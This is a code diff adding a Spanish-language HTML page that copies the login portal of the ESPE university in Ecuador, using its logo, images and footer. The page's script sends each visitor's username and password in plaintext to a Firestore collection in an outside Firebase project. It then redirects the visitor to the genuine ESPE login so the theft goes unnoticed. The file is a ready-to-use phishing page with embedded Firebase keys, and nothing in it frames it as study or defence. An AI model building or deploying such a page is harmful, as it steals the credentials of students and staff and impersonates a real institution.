@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mi ESPE</title>
+  <link rel="icon" href="https://srvcas.espe.edu.ec/authenticationendpoint/images/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .sidebar {
+            width: 150%;
+            overflow: hidden;
+        }
+
+        .sidebar img {
+            width: 100%;
+            display: none;
+        }
+
+        .sidebar img.active {
+            display: block;
+        }
+
+        .content {
+            flex-grow: 1;
+            display: flex;
+            justify-content: end;
+            align-items: center;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 440px;
+            text-align: center;
+            height: 100%;
+        }
+
+        .login-container img {
+            padding-top: 29px;
+            width: 301px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 19px);
+            padding: 9px;
+            margin: 6px 0;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+
+        .login-container button {
+            height: 50px;
+            width: 100%;
+            font-size: 20px !important;
+            padding: 10px 10px;
+            background-color: #222222;
+            border: none;
+            color: white;
+            margin-bottom: 20px;
+            margin-top: 5px;
+            cursor: pointer;
+        }
+
+        .login-container button:hover {
+            background-color: #5d81d2;
+        }
+
+        .login-container a {
+            display: block;
+            margin: 10px 0;
+            color: #007BFF;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+
+        .info-links {
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        .info-links2 {
+            font-size: 42px;
+            margin-top: -4px;
+            text-align: left;
+        }
+
+        .info-links ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .info-links ul li {
+            border-bottom: 1px solid #ddd;
+            padding: 5px 0;
+        }
+
+        .info-links ul li:last-child {
+            border-bottom: none;
+        }
+
+        .info-links a {
+            display: block;
+            margin: 5px 0;
+            color: #007BFF;
+            text-decoration: none;
+        }
+
+        .info-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer a {
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .fa {
+            margin-right: 8px;
+        }
+    </style>
+
+    <!-- Firebase configuration -->
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";
+        import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCGUvAMxb9FQ8O79eSU0lVds8243_QbNdU",
+            authDomain: "usuarioespe-72d83.firebaseapp.com",
+            projectId: "usuarioespe-72d83",
+            storageBucket: "usuarioespe-72d83.appspot.com",
+            messagingSenderId: "450026334467",
+            appId: "1:450026334467:web:b19009daab93582d08e136",
+            measurementId: "G-QDVHT5XKS2"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const auth = getAuth();
+        const db = getFirestore();
+
+        window.submitCredentials = async function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                // Add user data to Firestore
+                await addDoc(collection(db, "users"), {
+                    username: username,
+                    password: password
+                });
+                // Redirigir al usuario después de guardar los datos
+                window.location.href = "https://srvcas.espe.edu.ec/authenticationendpoint/login.do?Name=PreLoginRequestProcessor&commonAuthCallerPath=%252Fcas%252Flogin&forceAuth=true&passiveAuth=false&service=https%3A%2F%2Fmiespe.espe.edu.ec%2Fc%2Fportal%2Flogin&tenantDomain=carbon.super&sessionDataKey=c38b1b79-0434-4e72-bd58-c460ac38dc2a&relyingParty=portal_luminis&type=cas&sp=portal_luminis&isSaaSApp=false&authenticators=BasicAuthenticator:LOCAL";
+            } catch (error) {
+                const errorMessage = error.message;
+                alert("Error: " + errorMessage);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="slider-container">
+            <img class="sidebar-img active" src="https://srvcas.espe.edu.ec/authenticationendpoint/images/espe.jpg" alt="Imagen 1">
+            <img class="sidebar-img" src="https://srvcas.espe.edu.ec/authenticationendpoint/images/Iasa.jpg" alt="Imagen 2">
+            <img class="sidebar-img" src="https://srvcas.espe.edu.ec/authenticationendpoint/images/espe2.jpg" alt="Imagen 3">
+            <img class="sidebar-img" src="https://srvcas.espe.edu.ec/authenticationendpoint/images/Espel.jpg" alt="Imagen 4">
+            <img class="sidebar-img" src="https://srvcas.espe.edu.ec/authenticationendpoint/images/espe4.jpg" alt="Imagen 5">
+            <img class="sidebar-img" src="https://srvcas.espe.edu.ec/authenticationendpoint/images/sidebar-4.jpg" alt="Imagen 6">
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="login-container">
+            <img src="https://srvcas.espe.edu.ec/authenticationendpoint/images/Espe-Angular-Logo.png" alt="Logo">
+            <input type="text" id="username" placeholder="Usuario" required>
+            <input type="password" id="password" placeholder="Contraseña" required>
+            <button class="wr-btn grey-bg col-xs-12 col-md-12 col-lg-12 uppercase font-extra-large margin-bottom-double" type="submit" onclick="submitCredentials(event)">INGRESAR</button>
+            <div class="info-links2"><a href="#" onclick="forgotPassword()"> ¿Olvidó su Contraseña?</a></div>
+            <div class="info-links2"><a href="#" onclick="verifyUser()">Verifique su Usuario</a></div>
+            <div class="info-links2"><a href="#" onclick="helpDesk()">Mesa de Ayuda</a></div>
+
+            <div class="info-links">
+                <h4>INFORMACIÓN GENERAL</h4>
+                <span>Revise la información disponible, utilizando los siguientes enlaces:</span>
+                <ul>
+                    <li><a href="#"><i class="fa fa-user"></i>Información de Estudiantes</a></li>
+                    <li><a href="#"><i class="fa fa-file"></i>Información de Matrículas</a></li>
+                    <li><a href="#"><i class="fa fa-search"></i>Búsqueda de NRCs</a></li>
+                    <li><a href="#"><i class="fa fa-search-plus" aria-hidden="true"></i>Idiomas Búsqueda de NRCs</a></li>
+                </ul>
+            </div>
+
+            <div class="footer">
+                <a href="https://www.espe.edu.ec/"><a>© Universidad de las Fuerzas Armadas ESPE</a></a><br>
+                <span><b>Unidad de Tecnologías de la Información y Comunicaciones</b></span><br>
+                <span><b>UTIC PROD 1</b></span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var sidebarImages = document.querySelectorAll('.sidebar-img');
+        var currentIndex = 0;
+
+        function changeImage() {
+            sidebarImages[currentIndex].classList.remove('active');
+            currentIndex = (currentIndex + 1) % sidebarImages.length;
+            sidebarImages[currentIndex].classList.add('active');
+        }
+
+        setInterval(changeImage, 3000);
+    </script>
+</body>
+</html>
